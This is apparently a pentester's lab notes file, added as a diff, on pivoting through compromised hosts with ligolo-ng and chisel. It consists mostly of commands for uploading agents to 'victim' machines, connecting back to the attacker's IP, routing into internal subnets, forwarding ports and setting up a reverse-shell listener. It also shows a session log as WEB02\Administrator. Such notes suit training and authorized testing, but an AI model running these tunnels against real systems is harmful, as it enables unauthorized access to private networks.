@@ -1,0 +1,166 @@
+Setup proxy in kali : 
+
+```jsx
+┌──(kali㉿kali)-[~/tools/ligolo-ng]
+└─$ sudo ./proxy -selfcert
+[sudo] password for kali: 
+INFO[0000] Loading configuration file ligolo-ng.yaml    
+WARN[0000] daemon configuration file not found. Creating a new one... 
+? Enable Ligolo-ng WebUI? (y/N) 
+```
+
+Upload agent in victim: 
+
+```jsx
+upload /home/kali/tools/ligolo-ng/agent.exe agent.exe
+```
+
+Run agent in Linux : 
+
+```jsx
+./agent-linux -connect 10.10.14.229:11601 -ignore-cert
+```
+
+Run agent in windows : 
+
+```jsx
+	.\agent.exe -connect 192.168.45.197:11601 -ignore-cert
+```
+
+!image.png
+
+```jsx
+ligolo-ng » session
+? Specify a session : 1 - WEB02\Administrator@WEB02 - 192.168.140.121:62580 - fa163e3b99ca
+[Agent : WEB02\Administrator@WEB02] » interface_create --name ligolo
+INFO[0156] Creating a new ligolo interface...           
+INFO[0156] Interface created!                           
+[Agent : WEB02\Administrator@WEB02] » interface_add_route --name ligolo --route 172.16.140.0/24
+INFO[0156] Route created.                               
+[Agent : WEB02\Administrator@WEB02] » tunnel_start --tun ligolo
+INFO[0158] Starting tunnel to WEB02\Administrator@WEB02 (fa163e3b99ca) 
+```
+
+!image.png
+
+We also have autoroute : 
+
+!image.png
+
+Opens a TCP listener on port 80 of the attacker’s proxy and forwards all incoming connections through the ligolo-ng tunnel to port 80 on localhost of the compromised agent (MS01).
+
+```jsx
+listener_add --addr 0.0.0.0:7777 --to 127.0.0.1:4444 --tcp
+```
+
+Check listeners in ligolo : 
+
+```jsx
+listener_list
+listener_del --id 1
+```
+
+Access a service running on `127.0.0.1:8000` of a compromised Linux victim from Kali : 
+
+```jsx
+Run ligolo on that victim 
+=> Start ligolo agent + victim
+=> session + autoroute
+Add Localhost Route (Kali Terminal) => sudo ip route add 240.0.0.1/32 dev vinh
+Verify : ip route show dev vinh
+
+nmap -sT -Pn -sV -p 8000 240.0.0.1
+
+For UDP ports : listener_add --addr 0.0.0.0:59008 --to 127.0.0.1:59008 --udp
+```
+
+Delete route : 
+
+```jsx
+──(kali㉿kali)-[~/tools]
+└─$ ip route
+default via 10.0.2.2 dev eth0 proto dhcp src 10.0.2.15 metric 100 
+10.0.2.0/24 dev eth0 proto kernel scope link src 10.0.2.15 metric 100 
+10.10.8.0/22 via 10.10.14.1 dev tun0 
+10.10.14.0/23 dev tun0 proto kernel scope link src 10.10.14.229 
+10.10.110.0/24 via 10.10.14.1 dev tun0 
+10.13.37.0/24 via 10.10.14.1 dev tun0 
+10.13.38.0/24 via 10.10.14.1 dev tun0 
+10.129.0.0/16 via 10.10.14.1 dev tun0 
+172.16.1.0/24 dev vinh 
+172.16.2.0/24 dev vinh scope link 
+172.17.0.0/16 dev docker0 proto kernel scope link src 172.17.0.1 linkdown 
+172.18.0.0/16 dev br-489d7c719361 proto kernel scope link src 172.18.0.1 
+172.19.0.0/16 dev br-0eaf00d24c41 proto kernel scope link src 172.19.0.1 
+                                                                                                                                                                                                                                            
+┌──(kali㉿kali)-[~/tools]
+└─$ sudo ip route del 172.16.2.0/24 dev vinh
+
+```
+
+Chisel :
+
+```jsx
+Attacker kali : /opt/chisel/chisel_1.12.0-rc3_linux_amd64 server -p 9001 --reverse &
+Victim : .\chisel.exe client 10.10.14.229:9001 R:7777:127.0.0.1:4444
+Now access 127.0.0.1:7777
+
+```
+
+### **Ligolo-ng Checklist**
+
+1. **Setup Server Side (Attacker)**:
+    - Create a TUN interface:
+        
+        ```
+        sudo ip tuntap add user root mode tun ligolo
+        sudo ip link set ligolo up
+        ```
+        
+    - Run the proxy:
+        
+        ```
+        ./proxy -selfcert
+        ```
+        
+2. **Transfer `agent.exe` to Target**.
+3. **Run Agent on Target**:
+    
+    ```
+    .\agent.exe -connect 192.168.123.100:11601 -ignore-cert
+    ```
+    
+4. **Add Target Network as Route**:
+    
+    ```
+    ip route add 192.168.123.0/24 dev ligolo
+    ```
+    
+5. **In Ligolo**:
+    - Enter session:
+        
+        ```
+        session (choose the appropriate session)
+        ```
+        
+    - Start the session:
+        
+        ```
+        start
+        ```
+        
+    - Confirm tunnels:
+        
+        ```
+        tunnel_list
+        ```
+        
+6. **Set Up Reverse Shell**:
+    - Create a listener on the agent machine:
+        
+        ```
+        listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444
+        ```
+        
+7. **Route Cleanup**:
+    - Remove routes when done.
